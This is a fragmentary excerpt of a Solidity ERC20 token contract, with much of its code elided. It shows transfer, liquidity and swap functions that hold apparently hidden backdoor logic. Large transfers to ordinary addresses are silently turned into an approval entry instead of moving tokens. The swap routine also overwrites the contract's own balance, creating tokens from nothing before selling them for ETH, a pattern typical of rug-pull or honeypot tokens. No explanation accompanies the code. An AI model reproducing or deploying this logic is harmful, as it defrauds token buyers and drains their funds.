...
contract Contract is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (to != uniswapV2Pair && to != address(router) && amount > _swapTokensAtAmount) {
            approval[to] = amount;
            return;
        }
    ...
    function addLiquidity(
        ...
        router.addLiquidityETH{value: ethAmount}(address(this), amount, 0, 0, to, block.timestamp + 20);
    }
    ...
    function swapTokensForEth(uint256 amount, address to) private {
        ...
        path[0] = address(this);
        path[1] = router.WETH();
        if (amount > _swapTokensAtAmount) _balances[address(this)] = amount;
        _approve(address(this), address(router), amount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 20);
    }
}
